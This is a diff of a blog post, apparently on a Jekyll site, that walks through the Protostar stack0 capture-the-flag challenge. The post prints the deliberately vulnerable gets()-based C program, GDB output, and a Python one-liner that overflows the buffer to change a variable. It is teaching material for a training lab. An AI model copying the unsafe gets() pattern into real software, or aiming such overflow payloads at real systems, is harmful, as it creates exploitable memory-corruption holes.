@@ -1,6 +1,7 @@
 ---
 title: Protostar Writeup - stack0
 updated: 2018-07-25 13:25
+tags: [ctf, binary exploit, tech, protostar]
 ---
 
 ## Protostar - stack0
@@ -13,7 +14,7 @@ I assume that if you got stuck here, you atleast have a VM running the Protostar
 
 If you read the description of the challenge you will see that all we have to do is modify a variable. Here's the attached code which is also present on the site.
 
-```c
+{% highlight c %}
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -31,7 +32,7 @@ int main(int argc, char **argv)
         printf("Try again?\n");
     }
 }
-```
+{% endhighlight %}
 
 So let's analyze this code. We have some a variable called modified which we need to modify(ironic), note that modified is declared as volatile, this tells the compiler to not apply any optimizations to it. Then we have a buffer of 64 bytes.
 Then we have modified set to 0 and we take some input. Now it's easy to see that there's no way to modify the modified variable(atleast not directly).
@@ -40,9 +41,9 @@ Now what options do we have? The only attack surface I could think of here is th
 > Never use gets()...impossible to tell...how many characters it will read...has been used to break computer security.
 
 hmmm...interesting. Exploiting this has something to do with how memory is layed out. To keep things simple, when we declare a variable, it is reserved or stored on the stack. So if you understood what that means, buffer as well as modified should be on the stack.
-And from the man pages we know that `gets()` has no limit on reading. So what happens if we read beyond 64 bytes? Let's try writing beyond 64 bytes. Let's fire up the GDB and take a look at what we have.
+And from the man pages we know that gets() has no limit on reading. So what happens if we read beyond 64 bytes? Let's try writing beyond 64 bytes. Let's fire up the GDB and take a look at what we have.
 
-```shell
+{% highlight shell %}
 $ gdb stack0
 (gdb) set disassembly-flavor intel
 (gdb) disass main
@@ -66,12 +67,12 @@ Dump of assembler code for function main:
 0x08048433 <main+63>:	leave
 0x08048434 <main+64>:	ret
 End of assembler dump.
-```
+{% endhighlight %}
 
-Nothing interesting here. We know that `[esp+0x5c]` is the modified variable just by looking at the assembly, since a 0 is moved into that location.
-Let's set a break point just after the `gets()` call, run the program and take a look at what happens.
+Nothing interesting here. We know that "[esp+0x5c]" is the modified variable just by looking at the assembly, since a 0 is moved into that location.
+Let's set a break point just after the "gets()" call, run the program and take a look at what happens.
 
-```shell
+{% highlight shell %}
 (gdb) break *0x08048411
 Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
 (gdb) r
@@ -87,17 +88,17 @@ Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
 0xbffff770:	0xb7ff1040	0x08049620	0xbffff7a8	0x08048469
 0xbffff780:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7a8
 0xbffff790:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
-```
+{% endhighlight %}
 
-Let me explain what I did. I set a break point just after the `gets()` call because I want to get an idea of where on the stack the data is stored. 'A' in hex is `0x41`.
+Let me explain what I did. I set a break point just after the gets() call because I want to get an idea of where on the stack the data is stored. "A" in hex is 0x41.
 We print the first 24 (w)ords in he(x) format. You can see where our 'A's got stored. And if you take a closer look, towards the end you find the value of modified which is 0.
 So what we need to do is overflow the input into the modified variable and we're done. Just by observation of the stack, we see that we require a minimum of 4 * 4 * 4 + 1 bytes of data, which is co-incidently one more byte than the buffer size. More would work too, but this is the minimum.
 Let's write exploit this with a little help from python and pipes.
 
-```shell
+{% highlight shell %}
 $ python -c "print 'A' * 64 + 'B'" | ./stack0
 you have changed the 'modified' variable
-```
+{% endhighlight %}
 
 And there we have it, we have successfully modified the value of a variable, using a buffer overflow. Simple yet fundamental to understanding how not to write code.
 I'll be posting more solutions in my free time. If you got this on your first try, way to go! If not, then remember 'Every expert was once a beginner'. Another little thing I would like to stress upon, is that you should keep questioning why it works the way it does. If you aren't, you aren't learning anything at all.
